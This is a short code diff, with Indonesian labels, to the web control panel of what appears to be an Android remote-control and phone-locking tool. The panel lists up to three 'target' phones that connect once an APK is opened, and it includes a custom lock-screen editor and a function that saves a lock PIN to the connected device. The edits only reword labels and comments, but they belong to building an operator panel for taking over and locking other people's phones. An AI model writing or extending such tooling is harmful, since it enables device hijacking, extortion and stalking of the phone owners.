@@ -88,7 +88,7 @@
         <p class="text-[11px] font-semibold text-gray-600">Perangkat terdeteksi otomatis setelah APK dibuka (maks. 3 perangkat). Tap "HUBUNGKAN" untuk pakai fiturnya:</p>
         <div id="deviceList" class="space-y-2">
           <div class="text-center py-4 text-xs font-bold text-gray-500 border-2 border-dashed border-gray-300 rounded-lg">
-            Belum ada perangkat terdeteksi. Buka aplikasi di HP Target.
+            Belum ada perangkat terdeteksi. Tunggu Target Buka Aplikasi.
           </div>
         </div>
       </div>
@@ -161,7 +161,7 @@
       </button>
     </section>
 
-    <!-- 3. CUSTOM LOCK SCREEN HTML EDITOR -->
+    <!-- 3. CUSTOM LOCK SCREEN EDITOR -->
     <section class="neo-box bg-[#FEF08A] p-4 rounded-xl space-y-2">
       <h2 class="text-sm font-black uppercase text-black flex items-center gap-1.5">
         <svg class="w-4 h-4 stroke-black stroke-[2.5]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -471,7 +471,7 @@
         .catch(err => window.addLog(`Gagal ubah Lock HP: ${err.message}`, 'ERROR'));
     };
 
-    // TAMBAHAN: Simpan PIN & tampilan custom HTML layar kunci
+    // TAMBAHAN: Simpan PIN & tampilan custom layar kunci
     window.saveLockSettings = function() {
       if (!activeDeviceId) return alert("Hubungkan HP dulu!");
       const pin = document.getElementById('lockPinInput').value.trim() || "1234";
